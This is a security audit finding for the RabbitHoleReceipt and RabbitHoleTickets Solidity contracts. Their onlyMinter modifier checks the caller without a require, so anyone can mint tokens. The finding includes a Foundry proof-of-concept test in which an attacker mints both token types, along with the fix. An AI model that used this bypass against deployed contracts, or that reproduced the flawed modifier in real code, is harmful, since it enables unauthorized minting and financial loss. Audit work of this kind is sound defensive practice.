---
id: 18056
severity: "High"
---

# Bad implementation in minter access control for `RabbitHoleReceipt` and `RabbitHoleTickets` contracts

## Description

Both `RabbitHoleReceipt` and `RabbitHoleTickets` contracts define a `mint` function that is protected by a `onlyMinter` modifier:

RabbitHoleReceipt:
```solidity
function mint(address to_, string memory questId_) public onlyMinter {
    _tokenIds.increment();
    uint newTokenID = _tokenIds.current();
    questIdForTokenId[newTokenID] = questId_;
    timestampForTokenId[newTokenID] = block.timestamp;
    _safeMint(to_, newTokenID);
}
```

RabbitHoleTickets:
```solidity
function mint(address to_, uint256 id_, uint256 amount_, bytes memory data_) public onlyMinter {
    _mint(to_, id_, amount_, data_);
}
```

However, in both cases the modifier implementation is flawed as there isn’t any check for a require or revert, the comparison will silently return false and let the execution continue:
```solidity
modifier onlyMinter() {
    msg.sender == minterAddress;
    _;
}
```

## Proof of Concept

The following test demonstrates the issue.
```solidity
contract AuditTest is Test {
    address deployer;
    uint256 signerPrivateKey;
    address signer;
    address royaltyRecipient;
    address minter;
    address protocolFeeRecipient;

    QuestFactory factory;
    ReceiptRenderer receiptRenderer;
    RabbitHoleReceipt receipt;
    TicketRenderer ticketRenderer;
    RabbitHoleTickets tickets;
    ERC20 token;

    function setUp() public {
        deployer = makeAddr("deployer");
        signerPrivateKey = 0x123;
        signer = vm.addr(signerPrivateKey);
        vm.label(signer, "signer");
        royaltyRecipient = makeAddr("royaltyRecipient");
        minter = makeAddr("minter");
        protocolFeeRecipient = makeAddr("protocolFeeRecipient");

        vm.startPrank(deployer);

        // Receipt
        receiptRenderer = new ReceiptRenderer();
        RabbitHoleReceipt receiptImpl = new RabbitHoleReceipt();
        receipt = RabbitHoleReceipt(
            address(new ERC1967Proxy(address(receiptImpl), ""))
        );
        receipt.initialize(
            address(receiptRenderer),
            royaltyRecipient,
            minter,
            0
        );

        // factory
        QuestFactory factoryImpl = new QuestFactory();
        factory = QuestFactory(
            address(new ERC1967Proxy(address(factoryImpl), ""))
        );
        factory.initialize(signer, address(receipt), protocolFeeRecipient);
        receipt.setMinterAddress(address(factory));

        // tickets
        ticketRenderer = new TicketRenderer();
        RabbitHoleTickets ticketsImpl = new RabbitHoleTickets();
        tickets = RabbitHoleTickets(
            address(new ERC1967Proxy(address(ticketsImpl), ""))
        );
        tickets.initialize(
            address(ticketRenderer),
            royaltyRecipient,
            minter,
            0
        );

        // ERC20 token
        token = new ERC20("Mock ERC20", "MERC20");
        factory.setRewardAllowlistAddress(address(token), true);

        vm.stopPrank();
    }
    
    function test_RabbitHoleReceipt_RabbitHoleTickets_AnyoneCanMint() public {
        address attacker = makeAddr("attacker");

        vm.startPrank(attacker);

        // Anyone can freely mint RabbitHoleReceipt
        string memory questId = "a quest";
        receipt.mint(attacker, questId);
        assertEq(receipt.balanceOf(attacker), 1);

        // Anyone can freely mint RabbitHoleTickets
        uint256 tokenId = 0;
        tickets.mint(attacker, tokenId, 1, "");
        assertEq(tickets.balanceOf(attacker, tokenId), 1);

        vm.stopPrank();
    }
}
```

## Recommendation

The modifier should require that the caller is the `minterAddress` in order to revert the call in case this condition doesn’t hold.
```solidity
modifier onlyMinter() {
    require(msg.sender == minterAddress);
    _;
}
```

## Derived Narrative

The following field is derived content and may not be source-grounded:

The vulnerability is an authorization bypass in the mint functions of the RabbitHoleReceipt and RabbitHoleTickets contracts. Both contracts expose a public mint function that is guarded by an onlyMinter modifier, but the modifier is implemented as a plain expression (msg.sender == minterAddress) without a require or revert statement. Because the expression’s result is discarded, the modifier never stops execution when the caller is not the designated minter. The root cause is the missing enforcement of the access‑control condition, which turns the modifier into a no‑op. An attacker can therefore call receipt.mint or tickets.mint from any address, causing the contracts to mint new receipt NFTs or ticket tokens for themselves. This can be exploited by simply invoking the mint functions with arbitrary parameters; the transaction succeeds because the modifier does not revert, and the newly minted tokens are transferred to the attacker’s address. The impact is the uncontrolled creation of assets that should be limited to a trusted minter, leading to inflation of token supply, loss of revenue for the protocol, and erosion of trust for users who expect that only authorized contracts can issue receipts or tickets. The issue manifests whenever the mint functions are called, regardless of the value of minterAddress, and it affects all participants of the protocol – the contract owners, legitimate minters, token holders, and end‑users who may see unexpected tokens appear in their wallets. The flaw was discovered during a security audit by writing a test that called mint from an address that was not the minter; the test showed that the balance of the attacker increased, confirming the bypass. The problem is subtle because the modifier syntactically looks correct and the equality check is present, so a casual reviewer might assume the check is enforced. To remediate, the modifier must explicitly require the condition, for example: modifier onlyMinter() { require(msg.sender == minterAddress, "Caller is not minter"); _; }. Alternatively, using OpenZeppelin’s AccessControl or Ownable patterns would provide a robust, reusable access‑control mechanism. This class of bug is commonly referred to as an insecure or ineffective access‑control modifier, leading to unauthorized actions and potential financial loss.
